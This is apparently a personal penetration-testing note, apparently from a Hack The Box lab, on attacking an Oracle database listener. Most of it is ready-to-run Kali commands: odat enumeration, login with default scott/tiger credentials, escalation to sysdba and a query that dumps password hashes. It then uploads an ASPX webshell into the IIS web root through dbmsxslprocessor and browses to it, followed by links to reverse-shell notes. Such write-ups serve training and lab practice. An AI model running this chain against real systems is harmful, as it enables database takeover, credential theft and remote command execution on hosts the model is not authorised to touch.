 Client-side Oracle Net Services software uses the `tnsnames.ora` file to resolve service names to network addresses, while the listener process uses the `listener.ora` file to determine the services it should listen to and the behavior of the listener.


#### Oracle  Tools
```bash - kali
sudo apt install odat
```

```bash - kali
sudo apt install sqlplus
```

#### Enumeration
```bash - kali
sudo odat all -s $TARGET -p 1521
```

#### Log in with Credentials found 
```bash - kali
sqlplus $USERNAME/$PASWWORD@$TARGET:1521/XE
```


ERROR:

`sqlplus: error while loading shared libraries: libsqlplus.so: cannot open sh ared object file: No such file or directory`

```bash - kali
sudo sh -c "echo /usr/lib/oracle/12.2/client64/lib > /etc/ld.so.conf.d/oracle-instantclient.conf";sudo ldconfig
```


#### Enumeration

```oracle - sql
select table_name from all_tables;
```

```oracle - sql
select * from user_role_privs;
```

System Database Admin (sysdba), giving us higher privileges
```bash - kali
sqlplus $USERNAME/$PASWWORD@$TARGET:1521/XE as sysdba
```
To confirm privileges 
```oracle - sql
select * from user_role_privs;
```
To Extract Password Hashes 
```
 select name, password from sys.user$;
```


#### File Upload

|**OS**|**Path**|
|---|---|
|Linux|`/var/www/html`|
|Windows|`C:\inetpub\wwwroot`|



```bash - kali
odat all -s $TARGET -d XE -U SCOTT -P tiger --sysdba
```

```bash - kali
odat dbmsxslprocessor --sysdba -s $TARGET -U $USERNAME -P $PASSWORD -d XE --putFile "C:\\inetpub\\wwwroot\\" "test.txt" "/home/kali/Desktop/HTB/test.txt" 
```

```bash - kali
cp /usr/share/webshells/aspx/cmdasp.aspx .
```

```bash - kali
odat dbmsxslprocessor --sysdba -s $TARGET -U scott -P tiger -d XE --putFile "C:\\inetpub\\wwwroot\\" "cmdasp.aspx" "/home/kali/Desktop/HTB/Silo/cmdasp.aspx"
```

```html - firefox
http://10.129.95.188/cmdasp.aspx
```

![[rlwrap]]

![[1._Reverse Shells (WIN)#Invoke-Powershell ps1]]

